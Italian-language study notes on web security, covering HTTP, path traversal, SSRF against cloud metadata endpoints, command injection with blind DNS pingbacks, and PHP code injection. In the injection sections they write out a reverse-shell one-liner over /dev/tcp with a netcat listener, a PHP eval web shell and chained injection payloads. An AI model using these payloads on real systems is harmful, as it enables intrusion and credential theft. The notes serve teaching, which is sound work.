# Web security 1

# HTTP

Protocollo di alto livello, pila ISO OSI, porta 80/443 e si basa sul TCP.
L'architettura HTTP segue la struttura client-server.
L'http è stateless.

URL identifica dove si trova la risorsa:

- http: schema
- foobar.com: host
- :8080: porta
- view.php=id=1: URL-path ("/<directory>/<file>?<query>#fragment") ad oggi i path sono virtuali

La query è una rappresentazione chiave valore:
varname1=value1&varname2=value2

Caratteri particolari nei path:

- "#": ignora tutto quello che viene dopo il cancelletto
- "&": separa più variabili

Possiamo anche in modo opzionale inserire il nome utente e la password (es. http://admin:password@foobar.com/)

# URL encoding

Converte in maniera opportuna i caratteri speciali come # oppure come in caso di &.
Questo avviene per evitare situazioni di ambiguità nelle richieste al server.

# HTTP request e responses

Hanno particolari dati:

- la riga di richiesta e di risposta (es. GET / HTTP/1.1)
- header fields -> servono per inviare dati in più al server, sono obbligatori i campi host e content-encoding/content-length se abbiamo un body
- body fields

Metodi:

- GET
- POST
- PUT
- DELETE
- PATCH
- OPTION

Ogni risposta ha anche uno stato che viene inviato al client per dare informazioni riguardo lo stato della risposta.

I cookie vengono utilizzati nelle richieste HTTP per poter ad esempio dare informazioni riguardo la sessione del nostro utente, ad esempio inviare il cookie di sessione per risparmiare ogni volta il login.

# Sicurezza

- Integrità -> Informazione sempre completa e non alterata
- Confidenzialità -> info accessibile solo a chi ha diritto di accedervi
- Disponibilità -> Informazione accessibile quando necessario e richiesto da un utente.

Una vulnerabilità consente di attaccare un sistema.
Vengono anche utilizzati possibili attacchi attraverso strategie come i penetration test per poi poter agire di conseguenza e proteggere in modo opportuno il servizio.
Parliamo di sicurezza:

- Server-Side
- Client-Side

Ci sono due metodi per trovare le vulnerabilità:

- blackbox -> non conosciamo niente del sistema che stiamo attaccando
- whitebox -> conosciamo tutto del sistema che stiamo attaccando

Per eseguire richieste:

- curl o wget -> da terminale
- requests -> python
- burp suite/ zap proxy
- ngrock

# File disclosure and server-side request forgery

## File disclosure

Un file disclosure è una vulnerabilità che consente di accedere a file che non dovrebbero essere accessibili.
Ad esempio una manipolazione dell'URL può consentire in caso di configurazione e permessi erratti di accedere a directory del sistema che non dovrebbero essere esposte.
Alcuni file che potrebbero essere molto pericolosi se esposti sono:

- database configuration contenenti credenziali di accesso
- tomcat-users.xml contenti credenziali di accesso al tomcat manager
- file come flask-configuration or web.config in una .net application che contiene le secret key usate per firmare la sessione
- sottrazzione di codice sorgente di alcuni prodotti
- .git directory

## Paths 101

attraverso percorsi relativi o assoluti, es. /usr/bin/firefox

- /usr/bin -> dirname
- /firefox -> basename

## Path traversal

Inserimento di codice dannoso attraverso i percorsi come ad esempio nello url:

- Plain injection -> open(input)
- Prepended injection -> open(input + "/foobar")
- Appended injection -> open("/foobar" + input)
- Appended and Prepended -> open("/foo" + input + "/bar")

Per mitigare la vulnerabilità del path traversal viene utilizzata una blacklist di comandi, così da rifiutare input pericolosi o sanificarli.
Quest'ultime non sono sicure, ci potrebbero essere delle lacune nei controlli.

Come si può risolvere questo probelema?

- Regole di sicurezza, normalizzare i percorsi, sanificazione input
- chroot -> ad ogni tentativo di accesso negato l'interprete del linguaggio aumenta il livello di protezione per mantenere sicuro il nostro sistema

## Server-Side request forgery (SSRFs)

Consente ad un attaccante di effettuare operazioni come path traversal o esecuzione di comandi da remoto all'interno della rete del nostro servizio, così da avere un controllo dall'esterno delle nostre risorse.
Esistono diversi tipi di controllo:

- Controllo del pacchetto TCP: manipolazione di basso livello indirzzando richieste verso altri IP ad esempio.
- Controllo su richieste HTTP: es. header, body...
- host/port -> può accedere a host interni della rete

Quest'ultimi attacchi sono molto pericolosi perchè consente di bypassare anche il firewall.
Anche lo URL http://169.254.169.254/ può essere utile accedere in caso di SSRFs perchè contiene alcune informazioni sulla rete es IAM securtity credentials.

Se non è presente un output viene chiamata blind SSRF, ma può essere utile per mappare le risorse attive dietro al firewall.

Un altro modo di proteggersi in caso di SSRF è isolare l'host che esegue le richieste e assegnargli una whitelist di comandi anche se è limitativa come cosa.

![alt text](image.png)

# Command and code injections

## Command injections

Esecuzione di un comando malevolo che rischia di compromettere la confidenzialità, integrità e disponibilità di alcune risorse.

es. system("ping " . $\_GET["host"]);
Se all'interno di $\_GET["host"] è presente la seguente stringa "192.168.10.12;ls" verrà eseguito il ping e subito dopo (indipendentemente dall'esito) anche il comando ls.

Altri comandi che consentono la command injection in bash sono:

- ";" esecuzione di più comandi
- "\n" nuova linea
- "&&" esegue comando successivo solo se il comando precedente ha avuto successo
- "||" esegue comando successivo solo se quello precedente ha fallito
- `` o $() inserisce l'esito di un comando in una stringa

In un ambiente whitebox è molto più semplice trovare le vulenrabilità grazie agli output.
Quindi possiamo trovare i "sink" punti di codice in cui un utente usa determinate funzioni in modo pericoloso.
Esempi:

- sxec()
- system()
- popen()
- eval()
- backtics(``)

Un altro modo è quello di usare un pingback quindi utilizzare una connessione di ritorno verso un host controllato da un attaccante.
Un esempio è utilizzando un link generato da webhook sul quale noi manderemo le richieste attraverso le post, vedendo così i risultati.

Si possono anche aprire connessioni sulla macchina stessa attraverso comandi simili al seguente:
echo "Hello world" > /dev/tcp/localhost/1337
in questo caso stiamo inviando "hello world" alla porta 1337 del nostro localhost

DNS pingback è un altro metodo, il suo potere è quello di bypassare i firewall.
Creiamo un dns bin un dominio che registra tutte le richieste dns ricevute.
Se ad esempio inseriamo uno url e alla fine eseguiamo un comando nslookup del nostro dominio riceveremo quindi un riscontro se effettivamente il comando è stato eseguito dalla macchina, trovando così la vulnerabilità.
Requestbin ti fornirà un DNS name come il seguente:
_.sadjkandklmasdnjasndalskdna.d.requestbin.net
se al psoto del simbolo "_" insersici un test ecco che se riceverai la conferma sul tuo dns dell'interrogazione significa che il comando è stato eseguito quindi se concateni due comandi come ls&&nslookup test.sadjkandklmasdnjasndalskdna.d.requestbin.net
saprai se avrai eseguito il comando ls.

Se devi eseguire delle command injections blind, allora esegui ridirezioni dell'output di comandi su file o inviale a un server in tuo possesso (webhook).

Un ulteriore metodo è quello di creare una reverse shell utilizzando netcat ed esporlo sulla mia macchina attraverso ngrok.
command: nc -lvp 1337
Così facendo io posso iniettare del codice nella macchina vulnerabile aprendo una connessione sh usando il seguente comando:
sh -i > & /dev/tcp/ip/port 0>&1

## Code injection

Nella code injection l'input non viene eseguito dalla shell ma dall'interprete del linguaggio utilizzato.
Per identificare queste vulnerabilità è importante sapere che linguaggio si sta utilizzando e provare ad inserire caratteri speciali.
I caratteri speciali generici sono i seguenti:

- "'"
- "
- `
- $
- \

## PHP code injection

- La funzione include ci consente di importare file arbitrari all'interno del nostro codice. Per eseguire del codice dannoso sul server remoto deve prima essere iniettato e poi importato. Un altro modo è fare il poisoning di un file già esistente.
- Iniettare il codice dalla url per poi eseguirlo attraverso comando eval es. <?php eval($_GET["c"])?>
  Consiglio prima di scrivere codice molto complesso fare delle prove con ls.

Per proteggersi le regole sono sempre le medesimi whitelist e blacklist.
